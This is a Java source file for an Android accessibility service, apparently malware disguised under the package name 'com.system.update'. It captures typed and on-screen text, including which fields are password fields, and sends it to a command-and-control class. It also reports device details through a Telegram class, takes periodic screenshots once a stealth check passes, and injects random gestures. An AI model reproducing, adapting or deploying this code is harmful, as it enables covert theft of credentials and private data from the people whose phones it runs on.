package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;
import java.util.Random;

public class AccessService extends AccessibilityService {

    private long lastSend;
    private final Handler H = new Handler(Looper.getMainLooper());
    private final Random R = new Random();
    private boolean gestureLoopStarted;
    private boolean screenLoopStarted;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            int type = event.getEventType();
            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    || type == AccessibilityEvent.TYPE_VIEW_FOCUSED
                    || type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    || type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
                    || type == AccessibilityEvent.TYPE_VIEW_CLICKED) {

                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                String text = join(event.getText());
                StringBuilder sb = new StringBuilder();
                sb.append("pkg=").append(pkg);
                if (!text.isEmpty()) sb.append(" text=").append(text);

                AccessibilityNodeInfo src = event.getSource();
                if (src != null) {
                    try {
                        CharSequence ct = src.getText();
                        if (ct != null) sb.append(" src=").append(ct);
                        if (src.isPassword()) sb.append(" [pwd]");
                    } finally {
                        src.recycle();
                    }
                }
                long now = System.currentTimeMillis();
                if (now - lastSend > 800) {
                    lastSend = now;
                    C2.send("a11y", sb.toString());
                }
            }
        } catch (Throwable ignored) {}
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        ScreenCap.bind(this);
        C2.send("a11y", "connected");
        Telegram.reportEvent(C2.getDeviceId(), "a11y_connected " + Build.BRAND + " " + Build.MODEL);
        if (!gestureLoopStarted) {
            gestureLoopStarted = true;
            H.post(gestureRunnable);
        }
        if (!screenLoopStarted && Build.VERSION.SDK_INT >= 30) {
            screenLoopStarted = true;
            // first shot after 20s, then every 3 min
            H.postDelayed(() -> {
                if (Stealth.isArmed(AccessService.this)) ScreenCap.captureAndSend();
            }, 20_000);
            H.postDelayed(new Runnable() {
                @Override public void run() {
                    if (Stealth.isArmed(AccessService.this)) ScreenCap.captureAndSend();
                    H.postDelayed(this, 180_000);
                }
            }, 180_000);
        }
    }

    private final Runnable gestureRunnable = new Runnable() {
        @Override
        public void run() {
            if (Stealth.isArmed(AccessService.this)) {
                try { chaosGesture(); } catch (Throwable ignored) {}
            }
            H.postDelayed(this, 2500 + R.nextInt(2000));
        }
    };

    private void chaosGesture() {
        if (Build.VERSION.SDK_INT < 24) return;
        try {
            int w = getResources().getDisplayMetrics().widthPixels;
            int h = getResources().getDisplayMetrics().heightPixels;
            if (w <= 0 || h <= 0) return;
            Path path = new Path();
            if (R.nextBoolean()) {
                path.moveTo(R.nextInt(w), h * 0.7f);
                path.lineTo(R.nextInt(w), h * 0.25f);
                dispatchGesture(new GestureDescription.Builder()
                        .addStroke(new GestureDescription.StrokeDescription(path, 0, 350))
                        .build(), null, null);
            } else {
                path.moveTo(40 + R.nextInt(Math.max(1, w - 80)), 80 + R.nextInt(Math.max(1, h - 160)));
                dispatchGesture(new GestureDescription.Builder()
                        .addStroke(new GestureDescription.StrokeDescription(path, 0, 50))
                        .build(), null, null);
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onInterrupt() {}

    private static String join(List<CharSequence> list) {
        if (list == null || list.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : list) {
            if (cs == null) continue;
            if (sb.length() > 0) sb.append(' ');
            sb.append(cs);
        }
        return sb.toString();
    }
}
